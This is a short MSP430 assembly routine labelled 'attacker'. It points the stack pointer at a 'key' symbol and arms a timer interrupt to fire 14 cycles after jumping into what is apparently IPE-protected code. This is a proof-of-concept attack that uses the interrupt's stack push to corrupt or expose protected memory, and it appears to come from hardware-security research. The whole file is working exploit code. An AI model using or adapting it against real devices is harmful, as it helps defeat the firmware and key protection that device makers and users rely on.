	.sect ".text"
	.global TA0CCTL0
	.global TA0CCR0
	.global TA0CTL
	.global key
	.global ipe_nop
	.global attacker
	.global attack_end
	.global sp_buffer

attacker:
	mov SP, &sp_buffer
	mov #key+4,SP
	eint
	mov #0x0010, &TA0CCTL0	;TA0CCTL0 = CCIE;
	mov #0x000e,&TA0CCR0    ;TA0CCR0 = 14;
	mov #0x0214,&TA0CTL    ;TA0CTL = TASSEL__SMCLK| MC__UP | TACLR;
	bra #ipe_nop
attack_end:
	mov &sp_buffer, SP
	reta
